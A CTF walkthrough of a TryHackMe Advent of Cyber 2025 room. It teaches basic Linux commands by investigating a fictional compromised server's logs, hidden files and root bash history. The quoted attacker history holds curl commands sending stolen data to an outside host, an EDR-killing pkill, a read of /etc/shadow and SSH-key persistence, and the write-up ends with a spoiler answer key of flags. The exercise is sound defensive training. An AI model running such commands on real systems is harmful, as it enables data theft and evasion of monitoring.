# Day 01 — Linux CLI: Shells & Bells

**Platform:** TryHackMe — Advent of Cyber 2025  
**Category:** Linux CLI / Log Analysis  
**Difficulty:** Easy  
**Room:** [linuxcli-aoc2025](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)  
**Tools Used:** `echo`, `ls`, `cat`, `cd`, `grep`, `find`, `sudo`, `bash history`

---

## Objective

McSkidy has been kidnapped. The TBFC (The Best Festival Company) team needs to investigate **tbfc-web01**, a Linux server that processes Christmas wishlists, to find traces of the attack. Using only the Linux CLI, we must uncover what happened — no GUI, no shortcuts.

Learning objectives for this room:
- Learn the basics of the Linux command-line interface
- Explore its use for personal objectives and IT administration

---

## Environment Setup

The room launches a split-view Ubuntu terminal. No VPN is required when using TryHackMe's in-browser AttackBox.

| Field | Value |
|---|---|
| **Username** | `mcskidy` |
| **Password** | `AoC2025!` |
| **Hostname** | `tbfc-web01` |
| **SSH** | `ssh mcskidy@MACHINE_IP` *(if using VPN)* |

---

## Walkthrough

### Task 1 — Basic CLI Commands: `echo`, `ls`, `cat`

The terminal drops us into McSkidy's home directory. The first steps establish the most fundamental Linux commands.

**Commands run:**

```bash
echo "Hello World!"
ls
cat README.txt
```

`echo` prints a string to the terminal. `ls` lists the contents of the current directory. `cat` outputs the full contents of a file.

**Output from `cat README.txt`:**
```
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

McSkidy left a note before disappearing. She mentions hiding a guide and references "Eggsploits" on the servers. The `Guides` directory visible in `ls` output is the next target.

---

### Task 2 — Navigating the Filesystem: `cd` and Hidden Files

```bash
cd Guides
ls
```

The directory appears empty. In Linux, files prefixed with a dot (`.`) are hidden from standard `ls` output. This is used by sysadmins to conceal system files, and by attackers to hide malware — and apparently by McSkidy to hide her security guide.

```bash
ls -la
cat .guide.txt
```

The `-a` flag reveals hidden files. The `-l` flag shows extended details including permissions and ownership.

**Output:**
```
-rw-rw-r-- 1 mcskidy mcskidy 504 Oct 13 01:26 .guide.txt
```

**Contents of `.guide.txt`:**
```
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!
```

McSkidy's guide directly points to `/var/log/`.

---

### Task 3 — Log Analysis with `grep`

`/var/log/` stores system logs including `auth.log`, which records authentication events.
```bash
cd /var/log
grep "Failed password" auth.log
```

`grep` searches for a specific string within a file.

**Output (excerpt):**
```
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
```

Multiple failed login attempts against the `socmas` account, all originating from `eggbox-196.hopsec.thm`.. This pattern is consistent with a **brute-force attack** targeting the SOC-mas platform.

---

### Task 4 — File Discovery with `find`

The failed logins suggest the `socmas` account may have been compromised and used to plant malicious files. `find` lets us search the filesystem for files matching specific criteria.

```bash
find /home/socmas -name *egg*
```

The `*egg*` wildcard matches any filename containing the string "egg".

**Output:**
```
/home/socmas/2025/eggstrike.sh
```

A shell script was found.

```bash
cd /home/socmas/2025
ls
cat eggstrike.sh
```

**Directory contents:**
```
eggstrike.sh  node_modules  package.json  wishlist.txt  index.html  package-lock.json  secret-server.js
```

**Contents of `eggstrike.sh`:**
```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec

cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Christmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

The script exfiltrates the contents of `wishlist.txt` by dumping it to `/tmp/dump.txt`, deletes the original wishlist, and replaces it with a counterfeit `eastmas.txt` file.

---

### Task 5 — Privilege Escalation and Bash History Forensics

With evidence of an attack, the investigation moves to the root account to determine if Sir Carrotbane elevated privileges after the initial compromise.

```bash
sudo su
```

`sudo su` escalates to the root user using McSkidy's credentials. This works because `mcskidy` has sudo privileges on this machine.

```bash
cd ~
cat .bash_history
```

`.bash_history` is a hidden file in every user's home directory that records commands they have previously run.

**Root bash history (excerpt):**
```
whoami
cd ~
ll
nano .ssh/authorized_keys
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
```

The history reveals Sir Carrotbane's full post-exploitation chain:

| Command | Purpose |
|---|---|
| `nano .ssh/authorized_keys` | Added their SSH key for persistent backdoor access |
| `curl --data "@/tmp/dump.txt" ...` | Exfiltrated the dumped wishlist data |
| `curl --data "THM{until-we-meet-again}" ...` | Sent a flag to a C2 endpoint |
| `pkill tbfcedr` | Killed the TBFC EDR (Endpoint Detection and Response) process |
| `cat /etc/shadow` | Attempted to read hashed passwords for cracking |

---

## Answer Summary

<details>
<summary>Spoiler - click to reveal</summary>
  
| # | Question | Answer |
|---|---|---|
| 1 | Which CLI command would you use to list a directory? | `ls` |
| 2 | What flag did you see inside of McSkidy's guide? | `THM{learning-linux-cli}` |
| 3 | Which command helped you filter the logs for failed logins? | `grep` |
| 4 | What flag did you see inside the Eggstrike script? | `THM{sir-carrotbane-attacks}` |
| 5 | Which command would you run to switch to the root user? | `sudo su` |
| 6 | What flag did Sir Carrotbane leave in the root bash history? | `THM{until-we-meet-again}` |

</details>

---

## Attack Timeline Reconstruction

Piecing together the evidence, the full intrusion sequence was:

```
1. Brute-force login attempts against 'socmas' from eggbox-196.hopsec.thm
2. Successful compromise of 'socmas' account
3. Deployed eggstrike.sh to /home/socmas/2025/
4. Script executed: wishlist data staged to /tmp/dump.txt, original file deleted
5. Escalated to root (method unknown)
6. Added SSH key to /root/.ssh/authorized_keys for persistence
7. Exfiltrated /tmp/dump.txt to files.hopsec.thm
8. Killed TBFC EDR process
9. Read /etc/shadow 
10. Exited — leaving the "until-we-meet-again" flag
```

---

## Lessons Learned

**Commands introduced:**

| Command | Purpose |
|---|---|
| `echo` | Print text to terminal |
| `ls` / `ls -la` | List directory contents, including hidden files |
| `cat` | Display file contents |
| `cd` | Change directory |
| `grep` | Search for patterns within files |
| `find` | Search for files by name or attribute |
| `sudo su` | Escalate to root user |
| `cat .bash_history` | Review command history for forensic investigation |

**Key takeaways:**

- Hidden files (dot-prefixed) are commonly used by both admins and attackers; `ls -la` should always be part of your enumeration checklist.
- `grep` against `auth.log` is a fast, lightweight way to detect brute-force patterns without a full SIEM.
- Bash history is a high-value forensic artifact and should always be checked during incident response.
- Attackers consistently use `/tmp/` for staging because it requires no special permissions.
- Killing EDR processes (`pkill tbfcedr`) is a documented defense evasion technique tracked in MITRE ATT&CK.
- SSH `authorized_keys` persistence gives an attacker key-based access even if the compromised password is later changed.

---
*Part of the [Advent of Cyber 2025](../README.md) series · [CTFs Repository](../../../README.md)*
